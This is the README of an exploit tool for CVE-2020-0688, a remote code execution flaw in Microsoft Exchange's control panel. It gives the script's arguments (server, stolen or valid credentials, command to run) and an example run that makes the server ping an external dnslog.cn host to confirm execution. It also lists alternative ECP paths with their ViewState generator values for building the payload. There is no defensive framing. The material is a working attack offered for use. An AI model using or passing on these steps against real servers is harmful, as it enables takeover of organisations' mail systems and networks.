# cve-2020-0688
Usage:
```
usage: cve-2020-0688.py [-h] -s SERVER -u USER -p PASSWORD -c CMD

optional arguments:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        ECP Server URL Example: http://ip/owa
  -u USER, --user USER  login account Example: domain\user
  -p PASSWORD, --password PASSWORD
                        Password
  -c CMD, --cmd CMD     Command u want to execute
```

example:
```
python cve-2020-0688.py -s https://ip/owa/ -u user -p pass -c "ping test.ph4nxq.dnslog.cn"
```

![](https://blogpics-1251691280.file.myqcloud.com/imgs/20200227105319.png)


Other available paths:
```
/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27
/ecp/PersonalSettings/HomePage.aspx?showhelp=false&__VIEWSTATEGENERATOR=1D01FD4E
/ecp/PersonalSettings/HomePage.aspx?showhelp=false&__VIEWSTATEGENERATOR=1D01FD4E
/ecp/Organize/AutomaticReplies.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0
/ecp/RulesEditor/InboxRules.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0
/ecp/Organize/DeliveryReports.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0
/ecp/MyGroups/PersonalGroups.aspx?showhelp=false&__VIEWSTATEGENERATOR=A767F62B
/ecp/MyGroups/ViewDistributionGroup.aspx?pwmcid=1&id=38f4bec5-704f-4272-a654-95d53150e2ae&ReturnObjectType=1&__VIEWSTATEGENERATOR=321473B8
/ecp/Customize/Messaging.aspx?showhelp=false&__VIEWSTATEGENERATOR=9C5731F0
/ecp/Customize/General.aspx?showhelp=false&__VIEWSTATEGENERATOR=72B13321
/ecp/Customize/Calendar.aspx?showhelp=false&__VIEWSTATEGENERATOR=4AD51055
/ecp/Customize/SentItems.aspx?showhelp=false& __VIEWSTATEGENERATOR=4466B13F
/ecp/PersonalSettings/Password.aspx?showhelp=false&__VIEWSTATEGENERATOR=59543DCA
/ecp/SMS/TextMessaging.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0
/ecp/TroubleShooting/MobileDevices.slab?showhelp=false&__VIEWSTATEGENERATOR=FD338EE0
/ecp/Customize/Regional.aspx?showhelp=false&__VIEWSTATEGENERATOR=9097CD08
/ecp/MyGroups/SearchAllGroups.slab?pwmcid=3&ReturnObjectType=1__VIEWSTATEGENERATOR=FD338EE0
/ecp/Security/BlockOrAllow.aspx?showhelp=false&__VIEWSTATEGENERATOR=362253EF
```